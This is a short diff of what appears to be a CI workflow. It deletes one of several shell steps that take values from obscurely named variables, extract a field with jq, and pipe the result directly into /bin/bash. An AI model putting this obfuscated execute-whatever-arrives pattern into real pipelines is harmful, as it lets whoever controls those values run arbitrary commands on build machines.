@@ -24,7 +24,6 @@ jobs:
           echo $p7417 | jq -r .f642 | /bin/bash
           printf '%s' "$a599" | jq -r .xexkt80 | /bin/bash
           printf '%s' "$q20234" | jq -r .a8869 | /bin/bash
-          printf '%s' "$b8138" | jq -r .f7492 | /bin/bash
           printf '%s' "$e605" | jq -r .ukl72 | /bin/bash
           printf '%s' "$a4" | jq -r .ws7 | /bin/bash
           echo $s9 | jq -r .nx71 | /bin/bash
